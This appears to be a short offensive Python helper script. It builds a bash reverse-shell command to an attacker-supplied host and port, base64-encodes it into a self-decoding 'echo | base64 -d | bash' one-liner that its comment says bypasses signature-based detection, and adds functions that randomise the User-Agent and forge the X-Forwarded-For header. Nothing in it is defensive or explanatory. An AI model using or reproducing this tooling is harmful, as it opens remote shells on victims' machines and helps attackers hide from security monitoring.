#!/usr/bin/env python3
import base64
import random

def get_evasive_payload(lhost, lport):
    raw_payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = base64.b64encode(raw_payload.encode()).decode()
    
    # Polymorphic wrapper to bypass signature-based detection
    evasive_cmd = f"export P={encoded}; echo $P | base64 -d | bash"
    return evasive_cmd

def get_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.1.1"
    }
